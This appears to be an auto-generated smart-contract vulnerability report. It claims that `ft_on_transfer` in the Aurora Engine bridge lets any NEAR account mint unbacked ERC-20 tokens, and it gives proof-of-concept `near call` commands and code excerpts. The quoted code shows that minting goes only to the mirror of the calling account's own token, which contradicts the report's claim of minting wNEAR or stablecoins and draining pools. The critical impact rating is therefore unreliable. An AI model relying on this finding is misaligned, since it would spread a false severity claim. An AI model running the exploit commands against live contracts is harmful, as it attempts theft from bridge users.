### Title
Unrestricted `ft_on_transfer()` Allows Any NEAR Account to Mint Unbacked ERC-20 Bridged Tokens — (`engine/src/contract_methods/connector.rs`)

---

### Summary

`ft_on_transfer` on the Aurora Engine is the NEP-141 receiver callback, intended to be invoked only by a legitimate NEP-141 token contract as part of the `ft_transfer_call` flow. However, it performs **no check** that the caller is a registered or trusted NEP-141 token. Any NEAR account that has been registered as a NEP-141 mirror (which is itself open to anyone via `deploy_erc20_token`) can call `ft_on_transfer` directly, causing the engine to mint arbitrary amounts of ERC-20 bridged tokens without any actual NEP-141 token transfer having occurred.

---

### Finding Description

**Step 1 — Open ERC-20 deployment.**

`deploy_erc20_token` has no caller restriction: [1](#0-0) 

Only `require_running` is checked. Any NEAR account can call `deploy_erc20_token(Legacy("attacker.near"))` to register their own account as a NEP-141 token and deploy a corresponding ERC-20 mirror on Aurora.

**Step 2 — Unrestricted `ft_on_transfer`.**

The public entrypoint: [2](#0-1) 

dispatches to: [3](#0-2) 

The only branching logic is:

```rust
let result = if predecessor_account_id == get_connector_account_id(&io)? {
    engine.receive_base_tokens(&args)
} else {
    engine.receive_erc20_tokens(
        &predecessor_account_id,   // treated as the NEP-141 token
        &args,
        &current_account_id,
        handler,
    )
};
``` [4](#0-3) 

There is **no check** that `predecessor_account_id` is a legitimate NEP-141 token that has actually transferred tokens. Any NEAR account that is registered in the NEP-141↔ERC-20 map passes the `get_erc20_from_nep141` lookup inside `receive_erc20_tokens`.

**Step 3 — Unbacked minting.**

`receive_erc20_tokens` calls the ERC-20 `mint` function using the Aurora engine's own admin address as the caller, with the attacker-supplied `amount`: [5](#0-4) 

Because the engine is the ERC-20 admin, the mint succeeds unconditionally. The attacker receives ERC-20 tokens backed by zero NEP-141 tokens.

---

### Impact Explanation

**Critical — Insolvency / Direct theft of funds.**

An attacker mints an unbounded quantity of any ERC-20 bridged token (e.g., the wNEAR mirror, any bridged stablecoin) without depositing the underlying NEP-141 asset. These tokens are indistinguishable from legitimately bridged tokens and can be swapped, transferred, or used as collateral on any Aurora DeFi protocol, draining real user funds from liquidity pools and causing permanent insolvency of the bridge.

---

### Likelihood Explanation

**High.** The attack requires only:
1. A NEAR account (free to create).
2. One call to `deploy_erc20_token` (open to anyone, no cost beyond gas).
3. One direct call to `ft_on_transfer` from that account.

No privileged access, no leaked keys, no governance capture. The entire attack is executable by any unprivileged NEAR user in two transactions.

---

### Recommendation

`ft_on_transfer` must verify that the caller (`predecessor_account_id`) is a registered NEP-141 token **and** that the call originates from the legitimate `ft_transfer_call` flow (i.e., it is a callback, not a direct invocation). The simplest fix is to add a check analogous to `assert_private_call` or to verify `promise_results_count() >= 1` (ensuring it is a callback), combined with a whitelist of registered NEP-141 tokens that are allowed to trigger minting. Alternatively, restrict `ft_on_transfer` to only accept calls from the eth-connector account for base tokens, and from accounts that are already in the NEP-141↔ERC-20 registry **and** are calling as a genuine callback (not a direct invocation).

---

### Proof of Concept

```
# 1. Attacker creates NEAR account "attacker.near" (trivial)

# 2. Attacker registers their account as a NEP-141 token
near call aurora deploy_erc20_token \
  '{"nep141": "attacker.near"}' \
  --accountId attacker.near

# 3. Attacker calls ft_on_transfer directly from attacker.near
#    amount = 1_000_000_000_000_000_000 (arbitrary)
#    msg    = hex-encoded attacker EVM address
near call aurora ft_on_transfer \
  '{"sender_id": "attacker.near", "amount": "1000000000000000000", "msg": "<attacker_evm_addr_hex>"}' \
  --accountId attacker.near

# Result: Aurora engine mints 1e18 ERC-20 tokens to attacker's EVM address
# with zero NEP-141 tokens ever deposited.
# Attacker sells/swaps these unbacked tokens, draining real user funds.
```

The root cause is that `ft_on_transfer` at [3](#0-2)  performs no verification that the call is a genuine NEP-141 callback rather than a direct, attacker-initiated invocation, mirroring exactly the `onERC721Received()` pattern in the reference report.

pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let current_account_id = env.current_account_id();
        let predecessor_account_id = env.predecessor_account_id();
        let mut engine: Engine<_, _> = Engine::new(
            predecessor_address(&predecessor_account_id),
            current_account_id.clone(),
            io,
            env,
        )?;

        sdk::log!("Call ft_on_transfer");

        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };

        #[allow(clippy::used_underscore_binding)]
        let amount_to_return = if let Err(_err) = &result {
            sdk::log!("Error in ft_on_transfer: {_err:?}");
            // An error occurred, so we need to return the amount of tokens to the sender.
            args.amount.as_u128()
        } else {
            // Everything is ok, so return 0.
            0
        };

        let output = crate::prelude::format!("\"{amount_to_return}\"");
        io.return_output(output.as_bytes());

        // In case of an error, we just return Ok(None) to avoid a panic in the contract. It's ok
        // because in case of an error, we already returned the amount of tokens to the sender.
        Ok(result.unwrap_or(None))
    })
}

    pub fn receive_erc20_tokens<P: PromiseHandler>(
        &mut self,
        token: &AccountId,
        args: &FtOnTransferArgs,
        current_account_id: &AccountId,
        handler: &mut P,
    ) -> Result<Option<SubmitResult>, ContractError> {
        let amount = args.amount.as_u128();
        // Parse message to determine recipient
        let mut recipient = {
            // The message should contain the recipient EOA address.
            let message = args.msg.strip_prefix("0x").unwrap_or(&args.msg);
            // Recipient - 40 characters (Address in hex without '0x' prefix)
            if message.len() < 40 {
                return Err(ParseOnTransferMessageError::WrongMessageFormat.into());
            }
            let mut address_bytes = [0; 20];
            hex::decode_to_slice(&message[..40], &mut address_bytes)
                .map_err(|_| ParseOnTransferMessageError::WrongMessageFormat)?;
            Address::from_array(address_bytes)
        };

        if let Some(fallback_address) = silo::get_erc20_fallback_address(&self.io)
            && !silo::is_allow_receive_erc20_tokens(&self.io, &recipient)
        {
            recipient = fallback_address;
        }

        let erc20_token = get_erc20_from_nep141(&self.io, token)?;
        let erc20_admin_address = current_address(current_account_id);
        let result = self
            .call(
                &erc20_admin_address,
                &erc20_token,
                Wei::zero(),
                setup_receive_erc20_tokens_input(&recipient, amount),
                u64::MAX,
                Vec::new(), // TODO: are there values we should put here?
                Vec::new(),
                handler,
            )
            .and_then(submit_result_or_err)?;
